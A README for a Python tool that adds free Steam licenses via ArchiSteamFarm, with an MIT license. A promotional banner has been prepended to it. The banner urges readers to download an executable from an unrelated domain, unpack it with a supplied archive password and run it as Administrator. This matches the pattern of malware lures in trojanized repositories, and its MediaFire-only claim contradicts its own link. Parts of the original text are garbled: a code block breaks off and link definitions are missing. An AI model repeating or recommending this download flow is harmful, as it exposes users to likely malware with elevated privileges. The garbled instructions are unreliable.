<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

> [!Note]
> Consider switching to the ASF plugin [**`FreePackages`**][asf-free-citrinate] developped by **Citrinate**!

# Add Free Licenses

This repository contains Python code to automatically [add free licenses][steamdb-free-packages] on Steam.

![Illustration cover][img-cover]

## Requirements

- Install the latest version of [Python 3.X][python-download-url].
- Install the required packages:

```bash
pip install -r requirements.txt
```

- Install [ArchiSteamFarm][github-ASF] (ASF).
- Make sure that [IPC][wiki-ASF-IPC] is toggled ON. This is the default value.

## Data

To retrieve a list of appIDs which are already tied to your account,
here are a few methods.

<details><summary>1. /dynamicstore/userdata</summary>
<p>

The variable `rgOwnedApps` in the JSON data returned by
the [`/dynamicstore/userdata`][steam-userdata-endpoint] endpoint is
a large yet non-exhaustive list of appIDs owned by your account.
More information can be found on [this unofficial wiki][steam-userdata-wiki].

**NB:** you have to be **authenticated** on Steam in your web-browser in order to use this method.

---

</p>
</details>

<details><summary>2. steamctl apps list</summary>
<p>

[`steamctl`][steamctl-github] is a Python package [available on PyPI][steamctl-pypi].

It allows to print to the terminal
the exhaustive list of appIDs owned by your account.

```bash
pip install pipx
pipx install steamctl
```

```bash
steamctl apps list
```

The output should be formatted as follows: `{appID} {appName}`.

```
[...]
1667640 Imagined Leviathans Demo
1667710 Gladihaters Demo
1667730 Forgotten Journey
1667770 Samurai Shampoo
1667810 Riding Seas Demo
[...]
```

**NB:** you have to be **authenticated** on Steam with `steamctl` in order to use this method.

---

</p>
</details>

<details><summary>3. /games/?tab=all</summary>
<p>

**Caveat:** I recommend **not** to use this procedure
because the list of appIDs is not **exhaustive** ,
e.g. demos are missing.

A procedure built into the script
at [`Luois45`][luois45-gpl-repository]
parses a list of appIDs from
the [`/games/?tab=all`][steam-tab-all] web-page.

**NB:** the "game details" part of your Steam profile have to be public in order to use this method.

---

</p>
</details>

<details><summary>4. /account/licenses/</summary>
<p>

**Caveat:** I recommend **not** to use this procedure
because this retrieves **subIDs** instead of appIDs.

[Instructions][steam-account-licenses-instructions]
at [`Luois45`][luois45-gpl-repository]
suggest to execute JavaScript code in your browser
on the [`/account/licenses/`][steam-account-licenses] web-page.

**NB:** you have to be **authenticated** on Steam in your web-browser in order to use this method.

---

</p>
</details>

Because it is the only method which returns an **exhaustive** list, the recommended method is:

```bash
pip install pipx
## Usage

```bash
python add_free_licenses.py
```

## References

- A [Github issue][luois45-appid-issue] which describes some attempts to retrieve owned appIDs,
- [`Luois45/claim-free-steam-packages`][luois45-gpl-repository]: a tracker of free licenses on Steam,
- [`woctezuma/steam-next-fest`][steam-next-fest]: a previous project of mine which makes use of ASF IPC,
- A [Steam guide][steam-guide-no-cost] listing all of the free licenses which increment the library count.

<!-- Definitions -->


---

MIT License

Copyright (c) 2022 Wok

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
